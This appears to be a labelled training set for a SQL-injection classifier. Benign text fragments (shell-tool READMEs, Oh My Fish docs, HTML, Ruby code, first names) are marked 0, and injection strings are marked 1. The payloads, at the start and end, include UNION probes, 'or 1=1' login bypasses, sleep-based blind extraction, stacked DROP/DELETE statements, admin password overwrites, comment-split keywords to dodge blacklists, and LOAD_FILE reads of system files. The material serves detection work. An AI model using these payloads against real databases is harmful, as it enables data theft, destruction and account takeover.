+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT edad FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- INCi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT secid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mTfV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sitename FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EcIJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT artid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lGUc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gallid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kKBy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT main_module FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EThd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT contactid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Wcue",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aro_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ezey",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `replace` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mIFq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT total FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CHiF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT root FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- meoa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT prodid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OKtE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_paciente FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Depy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mosloadposition FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XZaM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT de FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wWlb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mossef FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rEtB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ordid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wQpO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT stdprice FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FEsf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT advanced FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WFJa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT super FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yGja",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT editor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vPsZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rol FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nHpV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT editors FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MjeM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mosvote FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Cxis",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT agent FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tBTD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT en FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NfCI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT searchbot FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Nqky",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cod_aplicacion FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NHAe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT manager FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ROYE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT instructions FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gLTs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT administrator FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bXrC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sure FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sMAl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT unless FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vqHo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `connect` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WVWj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xamppfiles FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HNzK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nix FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bFqX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mode FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- phDN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cleared FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VMkt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hFzl",1
+A few simple rules for this project:,0
+inviting and clear,0
+not tiring,0
+useful,0
+These below rules may be better:,0
+easy to contribute to (Markdown + HTML ...),0
+"easy to find (no TOC, maybe it's worth creating them?)",0
+Url marked * is temporary unavailable. Please don't delete it without confirming that it has permanently expired.,0
+Before add pull request please see this. All suggestions/PR are welcome!,0
+ Add useful shell functions,0
+ Add one-liners for collection tools (eg. CLI Tools),0
+ Generate book pdf format,0
+ Shells,0
+  __ Oh My ZSH! - the best framework for managing your Zsh configuration.,0
+"  __ bash-it - framework for using, developing and maintaining shell scripts and custom commands for your daily work.",0
+ Shells,0
+  __ Oh My ZSH! - the best framework for managing your Zsh configuration.,0
+"  __ bash-it - framework for using, developing and maintaining shell scripts and custom commands for your daily work.",0
+  __ Oh My Fish - the Fishshell framework.,0
+__ Managers,0
+"  __ Midnight Commander - visual file manager, licensed under GNU General Public License.",0
+  __ screen - full-screen window manager that multiplexes a physical terminal.,0
+"  __ tmux - terminal multiplexer, lets you switch easily between several programs in one terminal.",0
+"  __ tmux-cssh - sets a comfortable and easy to use functionality, clustering and synchronizing virtual tmux-sessions.",0
+__ Terminal emulators,0
+  __ Guake - is a dropdown terminal made for the GNOME desktop environment.,0
+"  __ Terminator - is based on GNOME Terminal, useful features for sysadmins and other users.",0
+__ Network,0
+omf update [omf] [<package>...],0
+"Update Oh My Fish, all package repositories, and all installed packages.",0
+"When called without arguments, update core and all installed packages.",0
+"You can choose to update only the core, by running omf update omf.",0
+"For selective package update, list only the names of packages you wish to update. You may still include ""omf"" in the list to update the core as well.",0
+Oh My Fish installer adds a snippet to fish's user config files (~/.config/fish/conf.d/) which calls OMF's startup code.,0
+"Notice that the scripts in that directory are sourced in the order that the filesystem sees them, and so it may be necessary to prefix your script files with ordering numbers.",0
+"For example: a_script.fish will take precedence over the omf.fish snippet. So if a_script.fish depends on plugins managed by OMF, consider renaming the script file to xx_a_script.fish.",0
+"Similiarly, to make sure that a script runs before omf.fish, you may prefix it with 00_. Alternatively, ~/.config/omf/before.init.fish may be used.",0
+# Golang developers might need this one,0
+set -xg GOPATH $HOME/gocode,0
+# Python developers otherwise,0
+set -xg PYTHONDONTWRITEBYTECODE 1,0
+"In fish 2.2, there is no conf.d directory, so the startup code has to be placed in the fish config file (~/.config/fish/config.fish).",0
+(_________)_,0
+(____)_,0
+(____)_(____)_,0
+(°__°)_,0
+(___)_,0
+(___`*),0
+(___`*),0
+(___´_),0
+(o___o)_)),0
+(o___o)_,0
+(‘_’)_,0
+(____)_,0
+(_` )/,0
+(___)__,0
+(__`;_;´__)__,0
+[___`_],0
+| ___*|_,0
+|*´___|q,0
+|`____|_,0
+|___|_,0
+* user,0
+* title,0
+** brown,0
+*** fix,0
+*** jubilder,0
+** of,0
+** t,0
+* select,0
+* dig,0
+# which,0
+# where,0
+## the,0
+### fox,0
+### fung,0
+## off,0
+## take,0
+# use,0
+# database,0
+"<div class=""modal-container dm-mute-notifications-dialog"">",0
+"<div class=""modal modal-medium draggable"">",0
+" <div class=""modal-content"">",0
+"<button type=""button"" class=""modal-btn modal-close js-close"">",0
+"<span class=""Icon Icon--close Icon--medium"">",0
+" <span class=""visuallyhidden"">___</span>",0
+</span>,0
+</button>,0
+" <div class=""modal-header"">",0
+" <h3 class=""modal-title"">________</h3>",0
+ </div>,0
+" <div class=""modal-footer submit-section"">",0
+" <button class=""EdgeButton EdgeButton--tertiary js-close"">_____</button>",0
+"<button class=""EdgeButton EdgeButton--primary modal-submit js-close"">____</button>",0
+"<style id=""react-native-stylesheet""></style>",0
+"!function(){window.initErrorstack||(window.initErrorstack=[]),window.onerror=function(r,i,n,o,t){r.indexOf(""Script error."")>-1||window.initErrorstack.push({errorMsg:r,url:i,lineNumber:n,column:o,errorObj:t})}}();",0
+Oh My Fish can scaffold a package structure for you. Use the command omf new,0
+To learn package creation let's create a new package that will provide a hello_world command for your shell. Package names may only contain lowercase letters and hyphens to separate words.,0
+$ omf new plugin hello_world,0
+$ ls -l,0
+  README.md,0
+  init.fish,0
+  functions/hello_world.fish,0
+  completions/hello_world.fish,0
+Always describe how your package works in the README.md.,0
+Also read more about auto completion and take care to provide it for your utilities when applicable.,0
+functions/hello_world.fish defines a single function:,0
+"function hello_world -d ""Prints hello world""",0
+"  echo ""Hello World!""",0
+end,0
+"Each function in your package must be declared in its own file under functions directory. This is required by fish autoloading mechanism, which loads functions on demand, avoiding loading unused functions at startup time.",0
+Hooks,0
+"Oh My Fish provides a ""hooks"" system that allows you to write scripts for your package that run when other interesting events occur. Packages can use these hooks to provide advanced installation, custom resource management, etc. Hooks are ordinary Fish scripts named after the event they are triggered by. Most hooks reside in a hooks directory inside a package's project directory.",0
+"Hooks that are called at startup time (init.fish and key_bindings.fish) can slow down shell startup. Be sure to avoid slow code at startup time! Also, if your package doesn't need a hook file, be sure to remove it.",0
+The working directory inside a hook is always set to the root directory of the package. The hooks Oh My Fish currently supports are listed below:,0
+class ApplicationController < ActionController::Base,0
+protect_from_forgery with: :null_session,0
+def after_sign_in_path_for(resource),0
+admin_root_path,0
+# 500 Internal Server Error,0
+def response_internal_server_error,0
+"render status: 500, json: { status: 500, message: 'Internal Server Error' }",0
+"def response_success(class_name, action_name)",0
+"render status: 200, json: { status: 200, message: ""Success #{class_name.capitalize} #{action_name.capitalize}"" }",0
+# 401 Unauthorized,0
+def response_unauthorized,0
+"render status: 401, json: { status: 401, message: 'Unauthorized' }",0
+def response_bad_request,0
+"render status: 400, json: { status: 400, message: 'Bad Request' }",0
+# 404 Not Found,0
+def response_not_found(class_name = 'page'),0
+"render status: 404, json: { status: 404, message: ""#{class_name.capitalize} Not Found"" }",0
+# 409 Conflict,0
+def response_conflict(class_name),0
+"render status: 409, json: { status: 409, message: ""#{class_name.capitalize} Conflict"" }",0
+Aaron,0
+Abel,0
+Abraham,0
+Abram,0
+Adam,0
+Adolph,0
+Adrian,0
+Alan,0
+Alastair,0
+Albert,0
+Alex,0
+Alexander,0
+Alexis,0
+Alf,0
+Alfie,0
+Alfred,0
+Algernon,0
+Clarence,0
+Clark,0
+Cliff,0
+Clifford,0
+Clifton,0
+Clive,0
+Clyde,0
+Cody,0
+Colin,0
+Conrad,0
+Constant,0
+Cornelius,0
+Cory,0
+Micky,0
+Mike,0
+Miles,0
+Mitchell,0
+Montague,0
+Morgan,0
+Morris,0
+Moses,0
+Myles,0
+Nate,0
+Natha,0
+Randolf,0
+Randolph,0
+Randy,0
+Raphael,0
+Ray,0
+Raymond,0
+Reginald,0
+Rex,0
+Reynold,0
+Richard,0
+Rick,0
+Ricky,0
+Rob,0
+Robert,0
+Robin,0
+Roderick,0
+Rodger,0
+Rodney,0
+Roger,0
+Roland,0
+Roman,0
+Ronald,0
+Ronnie,0
+Rowland,0
+Roy,0
+Rufus,0
+Rupert,0
+_______,0
+1'or admin' --,1
+1'or admin' #,1
+1'or  admin'/*,1
+1' or 1=1--,1
+1' or 1=1#,1
+1' or 1=1/*,1
+1') or '1'='1--,1
+1') or ('1'='1--,1
+ or '1' = '1';--,1
+1' or '1' = '1';--,1
+"SELECT if(substr((SELECT name FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+"SELECT if(substr((SELECT name FROM admin LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+"SELECT if(substr((SELECT name FROM member LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+"SELECT if(substr((SELECT name FROM top_users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+"SELECT if(substr((SELECT name FROM admin_users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+"SELECT if(substr((SELECT title FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+"SELECT if(substr((SELECT description FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+"SELECT if(substr((SELECT hoge FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1
+'admin'--',1
+/*!32 10*/,1
+/*!32302 10*/,1
+10;DROP members --,1
+hoge;DROP members --,1
+1;DROP members --,1
+#aaa;DROP members --,1
+1;DROP table --,1
+1;DROP users --,1
+DROP master;--,1
+DROP topic;--,1
+DROP employ;--,1
+DROP sample_table;--,1
+DROP USER;--,1
+DROP SAMPLE;#,1
+DROP TAG_LIST;#,1
+DROP COMMZENTS;#,1
+DROP TAG;#,1
+DROP LIKES;#,1
+;DELETE FROM gig_table--,1
+;DELETE FROM USERS--,1
+;DELETE FROM TEXT--,1
+;DELETE FROM SAMPLE_TABLE--,1
+;DELETE FROM HOGE_TABLE--,1
+0;DELETE FROM TABLE,1
+0;DELETE FROM USERS,1
+0;DELETE FROM COMMENTS,1
+0;DELETE FROM ADDRESSBOOK,1
+0;DELETE FROM BOOKING_TABLE,1
+1 ’||’ ,1
+’||’ ,1
+1’;DROP user;--,1
+1’;DROP member;--,1
+1’;DROP table;--,1
+1’;DROP admin_user;--,1
+1’;DROP topic;--,1
+1’;DROP sample;#,1
+1;DROP user;--,1
+111;DROP member;--,1
+;DROP TABLE;--,1
+;DROP ADMIN_USER;--,1
+;DROP GIGS;--,1
+;DROP SAMPLE_TABLE;#,1
+"SELECT /*!32302 1/0, */ 1 FROM USERS",1
+"SELECT /*!32302 1/0, */ 1 FROM SHOPS",1
+"SELECT /*!32302 1/0, */ 1 FROM PURCHASE",1
+"SELECT /*!32302 1/0, */ 1 FROM GIGS",1
+SELECT/*avoid-spaces*/password/**/FROM/**/TOPICS,1
+SELECT/*avoidfaefaewa*/password/**/FROM/**/members,1
+SELECT/*avoid-spaces*/id/**/FROM/**/buy,1
+SELECT/*avoid-spaces*/id/**/FROM/**/topics,1
+SELECT/**/id/**/FROM/**/shops,1
+DROP/*select from dddd*/events,1
+DROP/*aaaaaaa111*/sampletable,1
+DROP/**/prefectures,1
+DROP/**/tags,1
+DROP/**/likes,1
+DR/*comment*/OP/*blacklisting*/tables,1
+DR/*samole*/OP/*bypass blacklisting*/gigs,1
+DR/*sample*/OP/*bypass blacklisting*/gig_events,1
+DR/*testing*/OP/*bypass blacklisting*/datas,1
+DR/*hofe*/OP/*bypass blacklisting*/cities,1
+123; update account_table set pw='1' where uid='admin' --,1
+123; update account_table set pw='1' where uid='name' --,1
+123; update account_table set pw='2' where uid='hoge' --,1
+123; update account_table set pw='3' where uid='hogehoge' --,1
+123; update account_table set pw='4' where uid='111' --,1
+123; update account_table set pw='5' where uid='namae' --,1
+123; update account_table set pw='password' where uid='admin' --,1
+123; update account_table set pw='bbbbb' where uid='aaaaa' --,1
+123; update account_table set pw='12345' where uid='12345' --,1
+123; update account_table set pw='foo' where uid='admin' --,1
+drop; DROP TABLE members /* ,1
+1; DROP TABLE USERS /* ,1
+1; DROP TABLE TAGS /* ,1
+1; DROP TABLE TOPICS /* ,1
+1; DROP TABLE COMMENTS /* ,1
+1; DROP TABLE MEMBER /* ,1
+1; DROP TABLE SHOP /* ,1
+111; DROP TABLE USERS /* ,1
+1; DROP TABLE TEXTS /* ,1
+; UPDATE addressbook SET address = 'city,1
+; UPDATE addressbook SET address = 'hokkaido',1
+; UPDATE addressbook SET name = 'Tom',1
+; UPDATE addressbook SET name = 'Bob',1
+; UPDATE addressbook SET id = '1',1
+ exec id 1;delete from users;,1
+ exec name 1;delete from USERS;,1
+ exec title 1;delete from PURCHASE;,1
+ exec name 1;delete from SAMPLE_TABLE;,1
+ exec name 1;delete from HOGE;,1
+ exec hoge 1;delete from GIG;,1
+ exec title 1;delete from TOPIC;,1
+SELECT 0x50 + 0x4,1
+SELECT CHAR(0x5),1
+SELECT CHAR(0x44),1
+SELECT 0x46 + 0x66,1
+SELECT 0x46 + 0x67,1
+SELECT 0x46 + 0x68,1
+SELECT login + '-' + password FROM users,1
+SELECT login + '-' + password FROM admin_users,1
+SELECT login + '-' + password FROM members ,1
+"SELECT CONCAT(login, password) FROM members",1
+"SELECT CONCAT(login, password) FROM users",1
+"SELECT CONCAT(login, password) FROM admin_users",1
+SELECT 0x457578 ,1
+"SELECT CONCAT('0x',HEX('c:\\boot.ini')) 
+SELECT CONCAT('0x',HEX('c:\\boot.ini')) ",1
+"SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))",1
+SELECT LOAD_FILE(0x633A5C626F6F742E696E69) ,1
+"select char(65, 66, 67)",1
+IF (1=1) SELECT 'true' ELSE SELECT 'false',1
+"SELECT IF(1=1,'true','false')",1
+if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0,1
